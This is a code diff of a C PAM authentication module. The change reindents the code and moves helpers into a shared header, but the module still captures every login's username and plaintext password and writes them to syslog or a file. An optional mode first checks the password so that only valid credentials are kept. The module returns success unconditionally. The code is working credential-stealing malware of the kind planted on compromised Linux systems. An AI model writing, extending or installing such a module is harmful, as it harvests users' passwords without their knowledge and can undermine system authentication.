@@ -20,202 +20,174 @@
 
 /* --- includes --- */
 #include <stdio.h>
-#include <stdarg.h>   /* varg... */
 #include <string.h>   /* strcmp,strncpy,... */
 #include <stdlib.h>   /* calloc, setenv, putenv */
-//#include <getopt.h>
-
-#include <time.h>
-#include <pwd.h>
-#include <shadow.h>
-#include <crypt.h>
 
 #include <security/pam_appl.h>  /* pam_* */
 #include <security/pam_modules.h>
 
-#ifdef HAVE_CONFIG_H
-#  include "config.h"
-#endif
-#if HAVE_VSYSLOG
-#  include <syslog.h>   /* vsyslog */
-#endif
+#include <log_credentials_common.h>
+
 
 int log_only_good_credencials=0;
-char *log_filename=NULL;
-int use_syslog=1;
+
 
 /* internal helper functions */
-static void pam_syslog(int priority, const char *format, ...){
-	va_list args;
-	va_start(args, format);
-#if HAVE_VSYSLOG
-	openlog(PACKAGE, LOG_CONS, LOG_AUTHPRIV);
-	vsyslog(priority, format, args);
-	closelog();
-#else
-	vfprintf(stderr, format, args);
-#endif
-}
-
-static void pam_filelog(char *host, char *service, char *username, char *password){
-	FILE *logfile = fopen(log_filename, "a+");
-	if(logfile){
-		fprintf(logfile,"%lu host=%s service=%s user=%s pass=%s\n", (unsigned long)time(NULL), host, service, username, password);
-   		fclose(logfile);
-	}else{
-		pam_syslog(LOG_INFO, "Unable to write to log file: %s",log_filename);
-	}
-}
-
 int mod_options(int argc, const char **argv){
-	int i;
-	for (i = 0; i < argc; i++) {
-		if (strcmp(argv[i], "onlytrueusers") == 0){
-			log_only_good_credencials=1;
-			continue;
-		}
-	    	if (strncmp(argv[i], "file=", 5) == 0){
-			use_syslog=0;
-        		log_filename = malloc(strlen(argv[i]) + 1 );
-            		strcpy( log_filename, argv[i] + 5);
-			continue;
-		}
-	}
-	return 0;
+								int i;
+								for (i = 0; i < argc; i++) {
+																if (strcmp(argv[i], "onlytrueusers") == 0) {
+																								log_only_good_credencials=1;
+																								continue;
+																}
+																if (strncmp(argv[i], "file=", 5) == 0) {
+																								use_syslog=0;
+																								log_filename = malloc(strlen(argv[i]) + 1 );
+																								strcpy( log_filename, argv[i] + 5);
+																								continue;
+																}
+								}
+								return 0;
 }
 
 static int pam_set_authtok(pam_handle_t *pamh, int flags, int argc, const char **argv, char *prompt, int authtok){
-	int retval;
-	struct pam_message message[1],*pam_msg[1];
-	struct pam_response *response = NULL;
-	struct pam_conv *conversation;
+								int retval;
+								struct pam_message message[1],*pam_msg[1];
+								struct pam_response *response = NULL;
+								struct pam_conv *conversation;
 
-	pam_msg[0] = &message[0];
-	message[0].msg_style = PAM_PROMPT_ECHO_OFF;
-	message[0].msg = prompt;
+								pam_msg[0] = &message[0];
+								message[0].msg_style = PAM_PROMPT_ECHO_OFF;
+								message[0].msg = prompt;
 
-	retval = pam_get_item(pamh, PAM_CONV, (const void **)(void *) &conversation);
-	if (retval == PAM_SUCCESS){
-		retval = conversation->conv(1, (const struct pam_message **) pam_msg, &response, conversation->appdata_ptr);
-		if (retval == PAM_SUCCESS){
-			if ((flags & PAM_DISALLOW_NULL_AUTHTOK) && response[0].resp == NULL) {
-				free(response);
-				return PAM_AUTH_ERR;
-			}else{
-				retval = pam_set_item(pamh, authtok, response[0].resp);
-				free(response);
-				return retval;
-			}
-		}else{
-			pam_syslog(LOG_INFO, "conversation returned error: %s", pam_strerror(pamh,retval));
-			return retval;
-		}
-	}else{
-		pam_syslog(LOG_INFO, "pam_get_item(conversation) returned error: %s", pam_strerror(pamh,retval));
-		return retval;
-	}
+								retval = pam_get_item(pamh, PAM_CONV, (const void **)(void *) &conversation);
+								if (retval == PAM_SUCCESS) {
+																retval = conversation->conv(1, (const struct pam_message **) pam_msg, &response, conversation->appdata_ptr);
+																if (retval == PAM_SUCCESS) {
+																								if ((flags & PAM_DISALLOW_NULL_AUTHTOK) && response[0].resp == NULL) {
+																																free(response);
+																																return PAM_AUTH_ERR;
+																								}else{
+																																retval = pam_set_item(pamh, authtok, response[0].resp);
+																																free(response);
+																																return retval;
+																								}
+																}else{
+																								pam_syslog(LOG_INFO, "conversation returned error: %s", pam_strerror(pamh,retval));
+																								return retval;
+																}
+								}else{
+																pam_syslog(LOG_INFO, "pam_get_item(conversation) returned error: %s", pam_strerror(pamh,retval));
+																return retval;
+								}
 }
 
-struct pam_response *pam_response_reply; 
- 
-int conversation_helper_func(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr){  
-	*resp = pam_response_reply;  
-	return PAM_SUCCESS;  
-}  
+struct pam_response *pam_response_reply;
 
-int verify_credentials(const char *username, const char *password){  
-	const struct pam_conv conversation_helper = {conversation_helper_func, NULL};  
-	pam_handle_t *local_auth_handle = NULL;
+int conversation_helper_func(int num_msg, const struct pam_message **msg, struct pam_response **resp, void *appdata_ptr){
+								*resp = pam_response_reply;
+								return PAM_SUCCESS;
+}
 
-	int retval;  
-	retval = pam_start("sudo", username, &conversation_helper, &local_auth_handle);  
+int verify_credentials(const char *username, const char *password){
+								const struct pam_conv conversation_helper = {conversation_helper_func, NULL};
+								pam_handle_t *local_auth_handle = NULL;
 
-	if (retval != PAM_SUCCESS){  
-		return 1;  
-	}  
+								int retval;
 
-	pam_response_reply = (struct pam_response *)malloc(sizeof(struct pam_response));  
-	pam_response_reply[0].resp = strdup(password);  
-	pam_response_reply[0].resp_retcode = 0;  
-	retval = pam_authenticate(local_auth_handle, 0);  
+								char service_name[150];
+								sprintf(service_name, "%s", "password-auth");
 
-	if (retval != PAM_SUCCESS){   
-		return 1;  
-	}  
+								retval = pam_start(service_name, username, &conversation_helper, &local_auth_handle);
+								if (retval != PAM_SUCCESS) {
+																return 1;
+								}
 
-	retval = pam_end(local_auth_handle, retval);  
+								pam_response_reply = (struct pam_response *)malloc(sizeof(struct pam_response));
+								pam_response_reply[0].resp = strdup(password);
+								pam_response_reply[0].resp_retcode = 0;
+								retval = pam_authenticate(local_auth_handle, 0);
 
-	if (retval != PAM_SUCCESS){  
-		return 1;  
-	}  
+								if (retval != PAM_SUCCESS) {
+																return 1;
+								}
 
-	return 0;  
-}  
+								retval = pam_end(local_auth_handle, retval);
+
+								if (retval != PAM_SUCCESS) {
+																return 1;
+								}
+
+								return 0;
+}
 
 /* --- authentication management functions --- */
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv){
-	int retval, i;
-	char *password;
-	char *host;
-	char *username;
-	char *service;
+								int retval, i;
+								char *password;
+								char *host;
+								char *username;
+								char *service;
 
-	mod_options(argc, argv);
+								mod_options(argc, argv);
 
-	retval=pam_get_item(pamh, PAM_SERVICE, (void*) &service);
-	if(retval != PAM_SUCCESS){
-		pam_syslog(LOG_INFO, "pam_get_item(service) returned error: %s", pam_strerror(pamh,retval));
-	}
+								retval=pam_get_item(pamh, PAM_SERVICE, (void*) &service);
+								if(retval != PAM_SUCCESS) {
+																pam_syslog(LOG_INFO, "pam_get_item(service) returned error: %s", pam_strerror(pamh,retval));
+								}
 
-	retval=pam_get_item(pamh, PAM_USER, (void*) &username);
-	if(retval != PAM_SUCCESS){
-		pam_syslog(LOG_INFO, "pam_get_item(username) returned error: %s", pam_strerror(pamh,retval));
-	}
+								retval=pam_get_item(pamh, PAM_USER, (void*) &username);
+								if(retval != PAM_SUCCESS) {
+																pam_syslog(LOG_INFO, "pam_get_item(username) returned error: %s", pam_strerror(pamh,retval));
+								}
 
-	retval=pam_get_item(pamh, PAM_RHOST, (void*) &host);
-	if(retval != PAM_SUCCESS){
-		pam_syslog(LOG_INFO, "pam_get_item(host) returned error: %s", pam_strerror(pamh,retval));
-	}
+								retval=pam_get_item(pamh, PAM_RHOST, (void*) &host);
+								if(retval != PAM_SUCCESS) {
+																pam_syslog(LOG_INFO, "pam_get_item(host) returned error: %s", pam_strerror(pamh,retval));
+								}else{
+																if(host==NULL) {
+																								host="localhost";
+																}
+								}
 
-	/* --- get password --- */
-	retval=pam_get_item(pamh, PAM_AUTHTOK, (void*) &password);
+								/* --- get password --- */
+								retval=pam_get_item(pamh, PAM_AUTHTOK, (void*) &password);
 
-	if (!password){
-		retval = pam_set_authtok(pamh, flags, argc, argv, "Password: ", PAM_AUTHTOK);
-		if(retval != PAM_SUCCESS){
-			pam_syslog(LOG_INFO, "pam_get_item(password) returned error: %s", pam_strerror(pamh,retval));
-		}else{
-			retval=pam_get_item(pamh, PAM_AUTHTOK, (void*) &password);
-			if(retval != PAM_SUCCESS){
-				pam_syslog(LOG_INFO, "pam_get_item(password) returned error: %s", pam_strerror(pamh,retval));
-			}
-		}
-	}
+								if (!password) {
+																retval = pam_set_authtok(pamh, flags, argc, argv, "Password: ", PAM_AUTHTOK);
+																if(retval != PAM_SUCCESS) {
+																								pam_syslog(LOG_INFO, "pam_get_item(password) returned error: %s", pam_strerror(pamh,retval));
+																}else{
+																								retval=pam_get_item(pamh, PAM_AUTHTOK, (void*) &password);
+																								if(retval != PAM_SUCCESS) {
+																																pam_syslog(LOG_INFO, "pam_get_item(password) returned error: %s", pam_strerror(pamh,retval));
+																								}
+																}
+								}
 
-	if(log_only_good_credencials==1){
-		if(verify_credentials(username, password)==0){
-			if(use_syslog==1){
-				pam_syslog(LOG_INFO,"host=%s service=%s user=%s pass=%s", host, service, username, password);
-			}else{
-				pam_filelog(host, service, username, password);
-			}
-		}
+								if(log_only_good_credencials==1) {
+																if(verify_credentials(username, password)==0) {
+																								if(use_syslog==1) {
+																																pam_syslog(LOG_INFO,"host=%s service=%s user=%s pass=%s", host, service, username, password);
+																								}else{
+																																pam_filelog(host, service, username, password);
+																								}
+																}
 
-    		free(log_filename);
-		return PAM_SUCCESS;
-	}
+																free(log_filename);
+																return PAM_SUCCESS;
+								}
 
-	if(use_syslog==1){
-		pam_syslog(LOG_INFO,"host=%s service=%s user=%s pass=%s", host, service, username, password);
-	}else{
-		pam_filelog(host, service, username, password);
-	}
+								if(use_syslog==1) {
+																pam_syslog(LOG_INFO,"host=%s service=%s user=%s pass=%s", host, service, username, password);
+								}else{
+																pam_filelog(host, service, username, password);
+								}
 
-	free( log_filename );
-	return PAM_SUCCESS;
+								free( log_filename );
+								return PAM_SUCCESS;
 }
 
 PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv){
-	return PAM_SUCCESS;
+								return PAM_SUCCESS;
 }
-
